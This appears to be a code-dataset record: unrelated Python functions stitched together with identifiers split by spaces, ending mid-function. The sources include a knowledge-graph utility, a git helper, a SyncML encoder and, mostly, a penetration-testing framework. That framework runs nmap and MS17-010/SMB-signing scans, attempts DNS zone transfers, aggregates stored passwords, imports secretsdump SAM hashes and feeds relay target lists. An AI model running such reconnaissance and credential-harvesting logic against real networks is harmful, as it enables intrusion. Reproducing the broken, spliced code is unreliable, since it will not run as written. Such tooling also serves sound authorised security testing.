def write index translation ( translation filename , entity ids , relation ids ) : translation = triple pb . Translation ( ) entities = [ ] for name , index in entity ids . items ( ) : translation . entities . add ( element = name , index = index ) relations = [ ] for name , index in relation ids . items ( ) : translation . relations . add ( element = name , index = index ) with open ( translation filename , "wb" ) as f : f . write ( translation . Serialize To String ( ) )
def write triples ( filename , triples , delimiter = DEFAULT DELIMITER , triple order = "hrt" ) : with open ( filename , 'w' ) as f : for t in triples : line = t . serialize ( delimiter , triple order ) f . write ( line + "\n" )
def read translation ( filename ) : translation = triple pb . Translation ( ) with open ( filename , "rb" ) as f : translation . Parse From String ( f . read ( ) ) def unwrap translation units ( units ) : for u in units : yield u . element , u . index return ( list ( unwrap translation units ( translation . entities ) ) , list ( unwrap translation units ( translation . relations ) ) )
def read openke translation ( filename , delimiter = '\t' , entity first = True ) : result = { } with open ( filename , "r" ) as f : = next ( f ) # pass the total entry number for line in f : line slice = line . rstrip ( ) . split ( delimiter ) if not entity first : line slice = list ( reversed ( line slice ) ) result [ line slice [ 0 ] ] = line slice [ 1 ] return result
def overview ( ) : doc = Host ( ) search = doc . search ( ) search . aggs . bucket ( 'tag count' , 'terms' , field = 'tags' , order = { ' count' : 'desc' } , size = 100 ) response = search . execute ( ) print line ( "{0:<25} {1}" . format ( 'Tag' , 'Count' ) ) print line ( "-" * 30 ) for entry in response . aggregations . tag count . buckets : print line ( "{0:<25} {1}" . format ( entry . key , entry . doc count ) )
def overview ( ) : search = Credential . search ( ) search . aggs . bucket ( 'password count' , 'terms' , field = 'secret' , order = { ' count' : 'desc' } , size = 20 ) . metric ( 'username count' , 'cardinality' , field = 'username' ) . metric ( 'host count' , 'cardinality' , field = 'host ip' ) . metric ( 'top hits' , 'top hits' , docvalue fields = [ 'username' ] , size = 100 ) response = search . execute ( ) print line ( "{0:65} {1:5} {2:5} {3:5} {4}" . format ( "Secret" , "Count" , "Hosts" , "Users" , "Usernames" ) ) print line ( "-" * 100 ) for entry in response . aggregations . password count . buckets : usernames = [ ] for creds in entry . top hits : usernames . append ( creds . username [ 0 ] ) usernames = list ( set ( usernames ) ) print line ( "{0:65} {1:5} {2:5} {3:5} {4}" . format ( entry . key , entry . doc count , entry . host count . value , entry . username count . value , usernames ) )
def pipe worker ( pipename , filename , object type , query , format string , unique = False ) : print notification ( "[{}] Starting pipe" . format ( pipename ) ) object type = object type ( ) try : while True : uniq = set ( ) # Remove the previous file if it exists if os . path . exists ( filename ) : os . remove ( filename ) # Create the named pipe os . mkfifo ( filename ) # This function will block until a process opens it with open ( filename , 'w' ) as pipe : print success ( "[{}] Providing data" . format ( pipename ) ) # Search the database objects = object type . search ( * * query ) for obj in objects : data = fmt . format ( format string , * * obj . to dict ( ) ) if unique : if not data in uniq : uniq . add ( data ) pipe . write ( data + '\n' ) else : pipe . write ( data + '\n' ) os . unlink ( filename ) except Keyboard Interrupt : print notification ( "[{}] Shutting down named pipe" . format ( pipename ) ) except Exception as e : print error ( "[{}] Error: {}, stopping named pipe" . format ( e , pipename ) ) finally : os . remove ( filename )
def create query ( section ) : query = { } if 'ports' in section : query [ 'ports' ] = [ section [ 'ports' ] ] if 'up' in section : query [ 'up' ] = bool ( section [ 'up' ] ) if 'search' in section : query [ 'search' ] = [ section [ 'search' ] ] if 'tags' in section : query [ 'tags' ] = [ section [ 'tags' ] ] if 'groups' in section : query [ 'groups' ] = [ section [ 'groups' ] ] return query
def create pipe workers ( configfile , directory ) : type map = { 'service' : Service Search , 'host' : Host Search , 'range' : Range Search , 'user' : User Search } config = configparser . Config Parser ( ) config . read ( configfile ) if not len ( config . sections ( ) ) : print error ( "No named pipes configured" ) return print notification ( "Starting {} pipes in directory {}" . format ( len ( config . sections ( ) ) , directory ) ) workers = [ ] for name in config . sections ( ) : section = config [ name ] query = create query ( section ) object type = type map [ section [ 'type' ] ] args = ( name , os . path . join ( directory , name ) , object type , query , section [ 'format' ] , bool ( section . get ( 'unique' , 0 ) ) ) workers . append ( multiprocessing . Process ( target = pipe worker , args = args ) ) return workers
def main ( ) : config = Config ( ) pipes dir = config . get ( 'pipes' , 'directory' ) pipes config = config . get ( 'pipes' , 'config file' ) pipes config path = os . path . join ( config . config dir , pipes config ) if not os . path . exists ( pipes config path ) : print error ( "Please configure the named pipes first" ) return workers = create pipe workers ( pipes config path , pipes dir ) if workers : for worker in workers : worker . start ( ) try : for worker in workers : worker . join ( ) except Keyboard Interrupt : print notification ( "Shutting down" ) for worker in workers : worker . terminate ( ) worker . join ( )
def main ( ) : search = Service Search ( ) services = search . get services ( up = True , tags = [ '!header scan' ] ) print notification ( "Scanning {} services" . format ( len ( services ) ) ) # Disable the insecure request warning urllib3 . disable warnings ( urllib3 . exceptions . Insecure Request Warning ) pool = Pool ( 100 ) count = 0 for service in services : count += 1 if count % 50 == 0 : print notification ( "Checking {}/{} services" . format ( count , len ( services ) ) ) pool . spawn ( check service , service ) pool . join ( ) print notification ( "Completed, 'http' tag added to services that respond to http, 'https' tag added to services that respond to https." )
def import nmap ( result , tag , check function = all hosts , import services = False ) : host search = Host Search ( arguments = False ) service search = Service Search ( ) parser = Nmap Parser ( ) report = parser . parse fromstring ( result ) imported hosts = 0 imported services = 0 for nmap host in report . hosts : if check function ( nmap host ) : imported hosts += 1 host = host search . id to object ( nmap host . address ) host . status = nmap host . status host . add tag ( tag ) if nmap host . os fingerprinted : host . os = nmap host . os fingerprint if nmap host . hostnames : host . hostname . extend ( nmap host . hostnames ) if import services : for service in nmap host . services : imported services += 1 serv = Service ( * * service . get dict ( ) ) serv . address = nmap host . address service id = service search . object to id ( serv ) if service id : # Existing object, save the banner and script results. serv old = Service . get ( service id ) if service . banner : serv old . banner = service . banner # TODO implement # if service.script results: # serv old.script results.extend(service.script results) serv old . save ( ) else : # New object serv . address = nmap host . address serv . save ( ) if service . state == 'open' : host . open ports . append ( service . port ) if service . state == 'closed' : host . closed ports . append ( service . port ) if service . state == 'filtered' : host . filtered ports . append ( service . port ) host . save ( ) if imported hosts : print success ( "Imported {} hosts, with tag {}" . format ( imported hosts , tag ) ) else : print error ( "No hosts found" ) return { 'hosts' : imported hosts , 'services' : imported services }
def nmap ( nmap args , ips ) : config = Config ( ) arguments = [ 'nmap' , '-Pn' ] arguments . extend ( ips ) arguments . extend ( nmap args ) output file = '' now = datetime . datetime . now ( ) if not '-o A' in nmap args : output name = 'nmap jackal {}' . format ( now . strftime ( "%Y-%m-%d %H:%M" ) ) path name = os . path . join ( config . get ( 'nmap' , 'directory' ) , output name ) print notification ( "Writing output of nmap to {}" . format ( path name ) ) if not os . path . exists ( config . get ( 'nmap' , 'directory' ) ) : os . makedirs ( config . get ( 'nmap' , 'directory' ) ) output file = path name + '.xml' arguments . extend ( [ '-o A' , path name ] ) else : output file = nmap args [ nmap args . index ( '-o A' ) + 1 ] + '.xml' print notification ( "Starting nmap" ) subprocess . call ( arguments ) with open ( output file , 'r' ) as f : return f . read ( )
def nmap scan ( ) : # Create the search and config objects hs = Host Search ( ) config = Config ( ) # Static options to be able to figure out what options to use depending on the input the user gives. nmap types = [ 'top10' , 'top100' , 'custom' , 'top1000' , 'all' ] options = { 'top10' : '--top-ports 10' , 'top100' : '--top-ports 100' , 'custom' : config . get ( 'nmap' , 'options' ) , 'top1000' : '--top-ports 1000' , 'all' : '-p-' } # Create an argument parser hs parser = hs . argparser argparser = argparse . Argument Parser ( parents = [ hs parser ] , conflict handler = 'resolve' , description = "Scans hosts from the database using nmap, any arguments that are not in the help are passed to nmap" ) argparser . add argument ( 'type' , metavar = 'type' , help = 'The number of ports to scan: top10, top100, custom, top1000 (default) or all' , type = str , choices = nmap types , default = 'top1000' , const = 'top1000' , nargs = '?' ) arguments , extra nmap args = argparser . parse known args ( ) # Fix the tags for the search tags = nmap types [ nmap types . index ( arguments . type ) : ] tags = [ "!nmap " + tag for tag in tags ] hosts = hs . get hosts ( tags = tags ) hosts = [ host for host in hosts ] # Create the nmap arguments nmap args = [ ] nmap args . extend ( extra nmap args ) nmap args . extend ( options [ arguments . type ] . split ( ' ' ) ) # Run nmap print notification ( "Running nmap with args: {} on {} hosts(s)" . format ( nmap args , len ( hosts ) ) ) if len ( hosts ) : result = nmap ( nmap args , [ str ( h . address ) for h in hosts ] ) # Import the nmap result for host in hosts : host . add tag ( "nmap {}" . format ( arguments . type ) ) host . save ( ) print notification ( "Nmap done, importing results" ) stats = import nmap ( result , "nmap {}" . format ( arguments . type ) , check function = all hosts , import services = True ) stats [ 'scanned hosts' ] = len ( hosts ) stats [ 'type' ] = arguments . type Logger ( ) . log ( 'nmap scan' , "Performed nmap {} scan on {} hosts" . format ( arguments . type , len ( hosts ) ) , stats ) else : print notification ( "No hosts found" )
def nmap smb vulnscan ( ) : service search = Service Search ( ) services = service search . get services ( ports = [ '445' ] , tags = [ '!smb vulnscan' ] , up = True ) services = [ service for service in services ] service dict = { } for service in services : service . add tag ( 'smb vulnscan' ) service dict [ str ( service . address ) ] = service nmap args = "-Pn -n --disable-arp-ping --script smb-security-mode.nse,smb-vuln-ms17-010.nse -p 445" . split ( " " ) if services : result = nmap ( nmap args , [ str ( s . address ) for s in services ] ) parser = Nmap Parser ( ) report = parser . parse fromstring ( result ) smb signing = 0 ms17 = 0 for nmap host in report . hosts : for script result in nmap host . scripts results : script result = script result . get ( 'elements' , { } ) service = service dict [ str ( nmap host . address ) ] if script result . get ( 'message signing' , '' ) == 'disabled' : print success ( "({}) SMB Signing disabled" . format ( nmap host . address ) ) service . add tag ( 'smb signing disabled' ) smb signing += 1 if script result . get ( 'CVE-2017-0143' , { } ) . get ( 'state' , '' ) == 'VULNERABLE' : print success ( "({}) Vulnerable for MS17-010" . format ( nmap host . address ) ) service . add tag ( 'MS17-010' ) ms17 += 1 service . update ( tags = service . tags ) print notification ( "Completed, 'smb signing disabled' tag added to systems with smb signing disabled, 'MS17-010' tag added to systems that did not apply MS17-010." ) stats = { 'smb signing' : smb signing , 'MS17 010' : ms17 , 'scanned services' : len ( services ) } Logger ( ) . log ( 'smb vulnscan' , 'Scanned {} smb services for vulnerabilities' . format ( len ( services ) ) , stats ) else : print notification ( "No services found to scan." )
def add tag ( ) : if len ( sys . argv ) > 1 : tag = sys . argv [ 1 ] doc mapper = Doc Mapper ( ) if doc mapper . is pipe : count = 0 for obj in doc mapper . get pipe ( ) : obj . add tag ( tag ) obj . update ( tags = obj . tags ) count += 1 print success ( "Added tag '{}' to {} object(s)" . format ( tag , count ) ) else : print error ( "Please use this script with pipes" ) else : print error ( "Usage: jk-add-tag <tag>" ) sys . exit ( )
def manual configure ( ) : print ( "Manual configuring jackal" ) mapping = { '1' : 'y' , '0' : 'n' } config = Config ( ) # Host host = input with default ( "What is the Elasticsearch host?" , config . get ( 'jackal' , 'host' ) ) config . set ( 'jackal' , 'host' , host ) # SSL if input with default ( "Use SSL?" , mapping [ config . get ( 'jackal' , 'use ssl' ) ] ) == 'y' : config . set ( 'jackal' , 'use ssl' , '1' ) if input with default ( "Setup custom server cert?" , 'y' ) == 'y' : ca certs = input with default ( "Server certificate location?" , config . get ( 'jackal' , 'ca certs' ) ) config . set ( 'jackal' , 'ca certs' , ca certs ) else : config . set ( 'jackal' , 'ca certs' , '' ) else : config . set ( 'jackal' , 'use ssl' , '0' ) if input with default ( "Setup client certificates?" , mapping [ config . get ( 'jackal' , 'client certs' ) ] ) == 'y' : config . set ( 'jackal' , 'client certs' , '1' ) client cert = input with default ( "Client cert location?" , config . get ( 'jackal' , 'client cert' ) ) config . set ( 'jackal' , 'client cert' , client cert ) client key = input with default ( "Client key location?" , config . get ( 'jackal' , 'client key' ) ) config . set ( 'jackal' , 'client key' , client key ) else : config . set ( 'jackal' , 'client certs' , '0' ) # Index index = input with default ( "What index prefix should jackal use?" , config . get ( 'jackal' , 'index' ) ) config . set ( 'jackal' , 'index' , index ) initialize indices = ( input with default ( "Do you want to initialize the indices?" , 'y' ) . lower ( ) == 'y' ) # Nmap nmap dir = input with default ( "What directory do you want to place the nmap results in?" , config . get ( 'nmap' , 'directory' ) ) if not os . path . exists ( nmap dir ) : os . makedirs ( nmap dir ) config . set ( 'nmap' , 'directory' , nmap dir ) nmap options = input with default ( "What nmap options do you want to set for 'custom' (for example '-p 22,445')?" , config . get ( 'nmap' , 'options' ) ) config . set ( 'nmap' , 'options' , nmap options ) # Nessus configure nessus = ( input with default ( "Do you want to setup nessus?" , 'n' ) . lower ( ) == 'y' ) if configure nessus : nessus host = input with default ( "What is the nessus host?" , config . get ( 'nessus' , 'host' ) ) nessus template = input with default ( "What template should jackal use?" , config . get ( 'nessus' , 'template name' ) ) nessus access = input with default ( "What api access key should jackal use?" , config . get ( 'nessus' , 'access key' ) ) nessus secret = input with default ( "What api secret key should jackal use?" , config . get ( 'nessus' , 'secret key' ) ) config . set ( 'nessus' , 'host' , nessus host ) config . set ( 'nessus' , 'template name' , nessus template ) config . set ( 'nessus' , 'access key' , nessus access ) config . set ( 'nessus' , 'secret key' , nessus secret ) # Named pipes configure pipes = ( input with default ( "Do you want to setup named pipes?" , 'n' ) . lower ( ) == 'y' ) if configure pipes : directory = input with default ( "What directory do you want to place the named pipes in?" , config . get ( 'pipes' , 'directory' ) ) config . set ( 'pipes' , 'directory' , directory ) config file = input with default ( "What is the name of the named pipe config?" , config . get ( 'pipes' , 'config file' ) ) config . set ( 'pipes' , 'config file' , config file ) if not os . path . exists ( directory ) : create = ( input with default ( "Do you want to create the directory?" , 'n' ) . lower ( ) == 'y' ) if create : os . makedirs ( directory ) if not os . path . exists ( os . path . join ( config . config dir , config file ) ) : f = open ( os . path . join ( config . config dir , config file ) , 'a' ) f . close ( ) config . write config ( initialize indices )
def config dir ( self ) : home = expanduser ( '~' ) config dir = os . path . join ( home , '.jackal' ) return config dir
def write config ( self , initialize indices = False ) : if not os . path . exists ( self . config dir ) : os . mkdir ( self . config dir ) with open ( self . config file , 'w' ) as configfile : self . config . write ( configfile ) if initialize indices : index = self . get ( 'jackal' , 'index' ) from jackal import Host , Range , Service , User , Credential , Log from jackal . core import create connection create connection ( self ) Host . init ( index = "{}-hosts" . format ( index ) ) Range . init ( index = "{}-ranges" . format ( index ) ) Service . init ( index = "{}-services" . format ( index ) ) User . init ( index = "{}-users" . format ( index ) ) Credential . init ( index = "{}-creds" . format ( index ) ) Log . init ( index = "{}-log" . format ( index ) )
def ensure remote branch is tracked ( branch ) : if branch == MASTER BRANCH : # We don't need to explicitly track the master branch, so we're done. return # Ensure the specified branch is in the local branch list. output = subprocess . check output ( [ 'git' , 'branch' , '--list' ] ) for line in output . split ( '\n' ) : if line . strip ( ) == branch : # We are already tracking the remote branch break else : # We are not tracking the remote branch, so track it. try : sys . stdout . write ( subprocess . check output ( [ 'git' , 'checkout' , '--track' , 'origin/%s' % branch ] ) ) except subprocess . Called Process Error : # Bail gracefully. raise System Exit ( 1 )
def main ( branch ) : try : # Ensure that we're in a git repository. This command is silent unless # you're not actually in a git repository, in which case, you receive a # "Not a git repository" error message. output = subprocess . check output ( [ 'git' , 'rev-parse' ] ) . decode ( 'utf-8' ) sys . stdout . write ( output ) except subprocess . Called Process Error : # Bail if we're not in a git repository. return # This behavior ensures a better user experience for those that aren't # intimately familiar with git. ensure remote branch is tracked ( branch ) # Switch to the specified branch and update it. subprocess . check call ( [ 'git' , 'checkout' , '--quiet' , branch ] ) # Pulling is always safe here, because we never commit to this branch. subprocess . check call ( [ 'git' , 'pull' , '--quiet' ] ) # Checkout the top commit in the branch, effectively going "untracked." subprocess . check call ( [ 'git' , 'checkout' , '--quiet' , '%s~0' % branch ] ) # Clean up the repository of Python cruft. Because we've just switched # branches and compiled Python files should not be version controlled, # there are likely leftover compiled Python files sitting on disk which may # confuse some tools, such as sqlalchemy-migrate. subprocess . check call ( [ 'find' , '.' , '-name' , '"*.pyc"' , '-delete' ] ) # For the sake of user experience, give some familiar output. print ( 'Your branch is up to date with branch \'origin/%s\'.' % branch )
def get interface name ( ) : interface name = '' interfaces = psutil . net if addrs ( ) for name , details in interfaces . items ( ) : for detail in details : if detail . family == socket . AF INET : ip address = ipaddress . ip address ( detail . address ) if not ( ip address . is link local or ip address . is loopback ) : interface name = name break return interface name
def load targets ( self ) : ldap services = [ ] if self . ldap : ldap services = self . search . get services ( ports = [ 389 ] , up = True ) self . ldap strings = [ "ldap://{}" . format ( service . address ) for service in ldap services ] self . services = self . search . get services ( tags = [ 'smb signing disabled' ] ) self . ips = [ str ( service . address ) for service in self . services ]
def write targets ( self ) : if len ( self . ldap strings ) == 0 and len ( self . ips ) == 0 : print notification ( "No targets left" ) if self . auto exit : if self . notifier : self . notifier . stop ( ) self . terminate processes ( ) with open ( self . targets file , 'w' ) as f : f . write ( '\n' . join ( self . ldap strings + self . ips ) )
def callback ( self , event ) : # IN CLOSE WRITE -> 0x00000008 if event . mask == 0x00000008 : if event . name . endswith ( '.json' ) : print success ( "Ldapdomaindump file found" ) if event . name in [ 'domain groups.json' , 'domain users.json' ] : if event . name == 'domain groups.json' : self . domain groups file = event . pathname if event . name == 'domain users.json' : self . domain users file = event . pathname if self . domain groups file and self . domain users file : print success ( "Importing users" ) subprocess . Popen ( [ 'jk-import-domaindump' , self . domain groups file , self . domain users file ] ) elif event . name == 'domain computers.json' : print success ( "Importing computers" ) subprocess . Popen ( [ 'jk-import-domaindump' , event . pathname ] ) # Ldap has been dumped, so remove the ldap targets. self . ldap strings = [ ] self . write targets ( ) if event . name . endswith ( ' samhashes.sam' ) : host = event . name . replace ( ' samhashes.sam' , '' ) # TODO import file. print success ( "Secretsdump file, host ip: {}" . format ( host ) ) subprocess . Popen ( [ 'jk-import-secretsdump' , event . pathname ] ) # Remove this system from this ip list. self . ips . remove ( host ) self . write targets ( )
def watch ( self ) : wm = pyinotify . Watch Manager ( ) self . notifier = pyinotify . Notifier ( wm , default proc fun = self . callback ) wm . add watch ( self . directory , pyinotify . ALL EVENTS ) try : self . notifier . loop ( ) except ( Keyboard Interrupt , Attribute Error ) : print notification ( "Stopping" ) finally : self . notifier . stop ( ) self . terminate processes ( )
def terminate processes ( self ) : if self . relay : self . relay . terminate ( ) if self . responder : self . responder . terminate ( )
def get template uuid ( self ) : response = requests . get ( self . url + 'editor/scan/templates' , headers = self . headers , verify = False ) templates = json . loads ( response . text ) for template in templates [ 'templates' ] : if template [ 'name' ] == self . template name : return template [ 'uuid' ]
def start scan ( self , scan id ) : requests . post ( self . url + 'scans/{}/launch' . format ( scan id ) , verify = False , headers = self . headers )
def cmp To Data Store uri ( base , ds1 , ds2 ) : ret = difflib . get close matches ( base . uri , [ ds1 . uri , ds2 . uri ] , 1 , cutoff = 0.5 ) if len ( ret ) <= 0 : return 0 if ret [ 0 ] == ds1 . uri : return - 1 return 1
def add tag ( self , tag ) : self . tags = list ( set ( self . tags or [ ] ) | set ( [ tag ] ) )
def remove tag ( self , tag ) : self . tags = list ( set ( self . tags or [ ] ) - set ( [ tag ] ) )
def to dict ( self , include meta = False ) : result = super ( Jackal Doc , self ) . to dict ( include meta = include meta ) if include meta : source = result . pop ( ' source' ) return { * * result , * * source } else : return result
def lookup ( cls , key , get = False ) : if get : item = cls . item dict . get ( key ) return item . name if item else key return cls . item dict [ key ] . name
def verbose ( cls , key = False , default = '' ) : if key is False : items = cls . item dict . values ( ) return [ ( x . key , x . value ) for x in sorted ( items , key = lambda x : x . sort or x . key ) ] item = cls . item dict . get ( key ) return item . value if item else default
def get configured dns ( ) : ips = [ ] try : output = subprocess . check output ( [ 'nmcli' , 'device' , 'show' ] ) output = output . decode ( 'utf-8' ) for line in output . split ( '\n' ) : if 'DNS' in line : pattern = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" for hit in re . findall ( pattern , line ) : ips . append ( hit ) except File Not Found Error : pass return ips
def zone transfer ( address , dns name ) : ips = [ ] try : print notification ( "Attempting dns zone transfer for {} on {}" . format ( dns name , address ) ) z = dns . zone . from xfr ( dns . query . xfr ( address , dns name ) ) except dns . exception . Form Error : print notification ( "Zone transfer not allowed" ) return ips names = z . nodes . keys ( ) print success ( "Zone transfer successfull for {}, found {} entries" . format ( address , len ( names ) ) ) for n in names : node = z [ n ] data = node . get rdataset ( dns . rdataclass . IN , dns . rdatatype . A ) if data : # TODO add hostnames to entries. # hostname = n.to text() for item in data . items : address = item . address ips . append ( address ) return ips
def resolve domains ( domains , disable zone = False ) : dnsresolver = dns . resolver . Resolver ( ) ips = [ ] for domain in domains : print notification ( "Resolving {}" . format ( domain ) ) try : result = dnsresolver . query ( domain , 'A' ) for a in result . response . answer [ 0 ] : ips . append ( str ( a ) ) if not disable zone : ips . extend ( zone transfer ( str ( a ) , domain ) ) except dns . resolver . NXDOMAIN as e : print error ( e ) return ips
def create connection ( conf ) : host config = { } host config [ 'hosts' ] = [ conf . get ( 'jackal' , 'host' ) ] if int ( conf . get ( 'jackal' , 'use ssl' ) ) : host config [ 'use ssl' ] = True if conf . get ( 'jackal' , 'ca certs' ) : host config [ 'ca certs' ] = conf . get ( 'jackal' , 'ca certs' ) if int ( conf . get ( 'jackal' , 'client certs' ) ) : host config [ 'client cert' ] = conf . get ( 'jackal' , 'client cert' ) host config [ 'client key' ] = conf . get ( 'jackal' , 'client key' ) # Disable hostname checking for now. host config [ 'ssl assert hostname' ] = False connections . create connection ( * * host config )
def search ( self , number = None , * args , * * kwargs ) : search = self . create search ( * args , * * kwargs ) try : if number : response = search [ 0 : number ] else : args , = self . core parser . parse known args ( ) if args . number : response = search [ 0 : args . number ] else : response = search . scan ( ) return [ hit for hit in response ] except Not Found Error : print error ( "The index was not found, have you initialized the index?" ) return [ ] except ( Connection Error , Transport Error ) : print error ( "Cannot connect to elasticsearch" ) return [ ]
def argument search ( self ) : arguments , = self . argparser . parse known args ( ) return self . search ( * * vars ( arguments ) )
def count ( self , * args , * * kwargs ) : search = self . create search ( * args , * * kwargs ) try : return search . count ( ) except Not Found Error : print error ( "The index was not found, have you initialized the index?" ) except ( Connection Error , Transport Error ) : print error ( "Cannot connect to elasticsearch" )
def argument count ( self ) : arguments , = self . argparser . parse known args ( ) return self . count ( * * vars ( arguments ) )
def id to object ( self , line ) : result = Range . get ( line , ignore = 404 ) if not result : result = Range ( range = line ) result . save ( ) return result
def argparser ( self ) : core parser = self . core parser core parser . add argument ( '-r' , '--range' , type = str , help = "The range to search for use" ) return core parser
def object to id ( self , obj ) : search = Service . search ( ) search = search . filter ( "term" , address = obj . address ) search = search . filter ( "term" , protocol = obj . protocol ) search = search . filter ( "term" , port = obj . port ) search = search . filter ( "term" , state = obj . state ) if search . count ( ) : result = search [ 0 ] . execute ( ) [ 0 ] return result . meta . id else : return None
def id to object ( self , line ) : user = User . get ( line , ignore = 404 ) if not user : user = User ( username = line ) user . save ( ) return user
def get users ( self , * args , * * kwargs ) : arguments , = self . argparser . parse known args ( ) if self . is pipe and self . use pipe : return self . get pipe ( self . object type ) elif arguments . tags or arguments . group or arguments . search or arguments . domain : return self . argument search ( ) else : return self . search ( * args , * * kwargs )
def get domains ( self ) : search = User . search ( ) search . aggs . bucket ( 'domains' , 'terms' , field = 'domain' , order = { ' count' : 'desc' } , size = 100 ) response = search . execute ( ) return [ entry . key for entry in response . aggregations . domains . buckets ]
def find object ( self , username , secret , domain = None , host ip = None , service id = None ) : # Not sure yet if this is advisable... Older passwords can be overwritten... search = Credential . search ( ) search = search . filter ( "term" , username = username ) search = search . filter ( "term" , secret = secret ) if domain : search = search . filter ( "term" , domain = domain ) else : search = search . exclude ( "exists" , field = "domain" ) if host ip : search = search . filter ( "term" , host ip = host ip ) else : search = search . exclude ( "exists" , field = "host ip" ) if service id : search = search . filter ( "term" , service id = service id ) else : search = search . exclude ( "exists" , field = "service id" ) if search . count ( ) : result = search [ 0 ] . execute ( ) [ 0 ] return result else : return None
def object to id ( self , obj ) : # Not sure yet if this is advisable... Older passwords can be overwritten... search = Credential . search ( ) search = search . filter ( "term" , username = obj . username ) search = search . filter ( "term" , secret = obj . secret ) if obj . domain : search = search . filter ( "term" , domain = obj . domain ) else : search = search . exclude ( "exists" , field = "domain" ) if obj . host ip : search = search . filter ( "term" , host ip = obj . host ip ) else : search = search . exclude ( "exists" , field = "host ip" ) if obj . service id : search = search . filter ( "term" , service id = obj . service id ) else : search = search . exclude ( "exists" , field = "service id" ) if search . count ( ) : result = search [ 0 ] . execute ( ) [ 0 ] return result . meta . id else : return None
def get credentials ( self , * args , * * kwargs ) : arguments , = self . argparser . parse known args ( ) if self . is pipe and self . use pipe : return self . get pipe ( self . object type ) elif arguments . tags or arguments . type or arguments . search or arguments . password or arguments . cracked or arguments . range or arguments . domain : return self . argument search ( ) else : return self . search ( * args , * * kwargs )
def commands2tree ( self , adapter , session , commands ) : # todo: trap errors... hdrcmd = commands [ 0 ] commands = commands [ 1 : ] if hdrcmd . name != constants . CMD SYNCHDR : raise common . Internal Error ( 'unexpected first command "%s" (expected "%s")' % ( hdrcmd . name , constants . CMD SYNCHDR ) ) if hdrcmd . version != constants . SYNCML VERSION 1 2 : raise common . Feature Not Supported ( 'unsupported Sync ML version "%s"' % ( hdrcmd . version , ) ) xsync = ET . Element ( constants . NODE SYNCML ) xhdr = ET . Sub Element ( xsync , hdrcmd . name ) if hdrcmd . version == constants . SYNCML VERSION 1 2 : ET . Sub Element ( xhdr , 'Ver DTD' ) . text = constants . SYNCML DTD VERSION 1 2 ET . Sub Element ( xhdr , 'Ver Proto' ) . text = hdrcmd . version ET . Sub Element ( xhdr , 'Session ID' ) . text = hdrcmd . session ID ET . Sub Element ( xhdr , 'Msg ID' ) . text = hdrcmd . msg ID xsrc = ET . Sub Element ( xhdr , 'Source' ) ET . Sub Element ( xsrc , 'Loc URI' ) . text = hdrcmd . source if hdrcmd . source Name is not None : ET . Sub Element ( xsrc , 'Loc Name' ) . text = hdrcmd . source Name xtgt = ET . Sub Element ( xhdr , 'Target' ) ET . Sub Element ( xtgt , 'Loc URI' ) . text = hdrcmd . target if hdrcmd . target Name is not None : ET . Sub Element ( xtgt , 'Loc Name' ) . text = hdrcmd . target Name if hdrcmd . resp Uri is not None : ET . Sub Element ( xhdr , 'Resp URI' ) . text = hdrcmd . resp Uri if hdrcmd . auth is not None and not session . auth Accepted : if hdrcmd . auth != constants . NAMESPACE AUTH BASIC : raise Not Implemented Error ( 'auth method "%s"' % ( common . auth2string ( hdrcmd . auth ) , ) ) if hdrcmd . auth == constants . NAMESPACE AUTH BASIC : xcred = ET . Sub Element ( xhdr , 'Cred' ) xmeta = ET . Sub Element ( xcred , 'Meta' ) ET . Sub Element ( xmeta , 'Format' , { 'xmlns' : constants . NAMESPACE METINF } ) . text = 'b64' ET . Sub Element ( xmeta , 'Type' , { 'xmlns' : constants . NAMESPACE METINF } ) . text = hdrcmd . auth ET . Sub Element ( xcred , 'Data' ) . text = base64 . b64encode ( '%s:%s' % ( adapter . peer . username , adapter . peer . password ) ) if hdrcmd . max Msg Size is not None or hdrcmd . max Obj Size is not None : xmeta = ET . Sub Element ( xhdr , 'Meta' ) if hdrcmd . max Msg Size is not None : ET . Sub Element ( xmeta , 'Max Msg Size' , { 'xmlns' : constants . NAMESPACE METINF } ) . text = hdrcmd . max Msg Size if hdrcmd . max Obj Size is not None : ET . Sub Element ( xmeta , 'Max Obj Size' , { 'xmlns' : constants . NAMESPACE METINF } ) . text = hdrcmd . max Obj Size xbody = ET . Sub Element ( xsync , constants . NODE SYNCBODY ) for cmdidx , cmd in enumerate ( commands ) : xcmd = ET . Sub Element ( xbody , cmd . name ) if cmd . cmd ID is not None : ET . Sub Element ( xcmd , 'Cmd ID' ) . text = cmd . cmd ID if cmd . name == constants . CMD ALERT : ET . Sub Element ( xcmd , 'Data' ) . text = str ( cmd . data ) xitem = ET . Sub Element ( xcmd , 'Item' ) ET . Sub Element ( ET . Sub Element ( xitem , 'Source' ) , 'Loc URI' ) . text = cmd . source ET . Sub Element ( ET . Sub Element ( xitem , 'Target' ) , 'Loc URI' ) . text = cmd . target if cmd . last Anchor is not None or cmd . next Anchor is not None or cmd . max Obj Size is not None : xmeta = ET . Sub Element ( xitem , 'Meta' ) xanch = ET . Sub Element ( xmeta , 'Anchor' , { 'xmlns' : constants . NAMESPACE METINF } ) if cmd . last Anchor is not None : ET . Sub Element ( xanch , 'Last' ) . text = cmd . last Anchor if cmd . next Anchor is not None : ET . Sub Element ( xanch , 'Next' ) . text = cmd . next Anchor if cmd . max Obj Size is not None : ET . Sub Element ( xmeta , 'Max Obj Size' , { 'xmlns' : constants . NAMESPACE METINF } ) . text = cmd . max Obj Size continue if cmd . name == constants . CMD STATUS : ET . Sub Element ( xcmd , 'Msg Ref' ) . text = cmd . msg Ref ET . Sub Element ( xcmd , 'Cmd Ref' ) . text = cmd . cmd Ref ET . Sub Element ( xcmd , 'Cmd' ) . text = cmd . status Of if cmd . source Ref is not None : ET . Sub Element ( xcmd , 'Source Ref' ) . text = cmd . source Ref if cmd . target Ref is not None : ET . Sub Element ( xcmd , 'Target Ref' ) . text = cmd . target Ref ET . Sub Element ( xcmd , 'Data' ) . text = cmd . status Code if cmd . next Anchor is not None or cmd . last Anchor is not None : xdata = ET . Sub Element ( ET . Sub Element ( xcmd , 'Item' ) , 'Data' ) xanch = ET . Sub Element ( xdata , 'Anchor' , { 'xmlns' : constants . NAMESPACE METINF } ) if cmd . last Anchor is not None : ET . Sub Element ( xanch , 'Last' ) . text = cmd . last Anchor if cmd . next Anchor is not None : ET . Sub Element ( xanch , 'Next' ) . text = cmd . next Anchor # NOTE: this is NOT standard Sync ML... if cmd . error Code is not None or cmd . error Msg is not None : xerr = ET . Sub Element ( xcmd , 'Error' ) if cmd . error Code is not None : ET . Sub Element ( xerr , 'Code' ) . text = cmd . error Code if cmd . error Msg is not None : ET . 